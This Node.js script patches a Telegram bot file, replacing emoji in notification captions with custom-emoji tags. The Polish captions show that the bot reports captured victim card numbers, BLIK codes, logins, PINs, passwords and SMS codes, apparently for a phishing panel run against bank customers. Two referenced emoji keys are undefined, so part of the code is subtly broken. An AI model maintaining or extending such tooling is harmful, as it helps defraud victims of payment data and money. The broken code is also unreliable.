const fs = require("fs");
const p = "bot.js";
let c = fs.readFileSync(p, "utf8");

const ID = {
	star: "5271666760603427350",
	sparkle: "5271792289612588924",
	box: "5271721242263577490",
	send: "5271993882492559766",
	gear: "5271588587903674739",
	cmd: "5272019892814504151",
	calstar: "5271790979647564149",
};
const pe = (k, ch) => `<tg-emoji emoji-id="${ID[k]}">${ch}</tg-emoji>`;

// HTML-owe captiony: naglowki + etykiety
const map = [
	// dane kupujacego
	['`📝 <b>Dane kupującego</b>', '`' + pe("quotes", "📝") + ' <b>Dane kupującego</b>'],
	// logowanie
	['`🔑 <b>Nowe logowanie</b>', '`' + pe("gear", "🔑") + ' <b>Nowe logowanie</b>'],
	// karta od victima
	['`💳 <b>Karta od victima</b>', '`' + pe("box", "💳") + ' <b>Karta od victima</b>'],
	['`💳 <b>Nowa karta</b>', '`' + pe("box", "💳") + ' <b>Nowa karta</b>'],
	// blik
	['`🔢 <b>Kod BLIK od victima</b>', '`' + pe("sparkle", "🔢") + ' <b>Kod BLIK od victima</b>'],
	['`🔢 <b>Nowy kod BLIK</b>', '`' + pe("sparkle", "🔢") + ' <b>Nowy kod BLIK</b>'],
	['`🔢 <b>Okno BLIK otwarte</b>', '`' + pe("send", "🔢") + ' <b>Okno BLIK otwarte</b>'],
	['`⚠️ <b>Okno BLIK zamknięte</b>', '`' + pe("quoteX", "⚠️") + ' <b>Okno BLIK zamknięte</b>'],
	['`⚠️ <b>Okno PIN zamknięte</b>', '`' + pe("quoteX", "⚠️") + ' <b>Okno PIN zamknięte</b>'],
	['`⚠️ <b>Okno hasła zamknięte</b>', '`' + pe("quoteX", "⚠️") + ' <b>Okno hasła zamknięte</b>'],
	['`⚠️ <b>Okno SMS zamknięte</b>', '`' + pe("quoteX", "⚠️") + ' <b>Okno SMS zamknięte</b>'],
	['`💳 <b>Okno karty otwarte</b>', '`' + pe("send", "💳") + ' <b>Okno karty otwarte</b>'],
	// przejecia
	['`💳 <b>Karta przejęta</b>', '`' + pe("sparkle", "💳") + ' <b>Karta przejęta</b>'],
	['`🔢 <b>Kod przejęty</b>', '`' + pe("sparkle", "🔢") + ' <b>Kod przejęty</b>'],
	['`🔐 <b>Kod z bota</b>', '`' + pe("cmd", "🔐") + ' <b>Kod z bota</b>'],
];

let n = 0;
for (const [a, b] of map) {
	const before = c;
	c = c.split(a).join(b);
	if (before !== c) n++; else console.log("BRAK", a.slice(0, 45));
}
fs.writeFileSync(p, c);
console.log("zmian:", n);
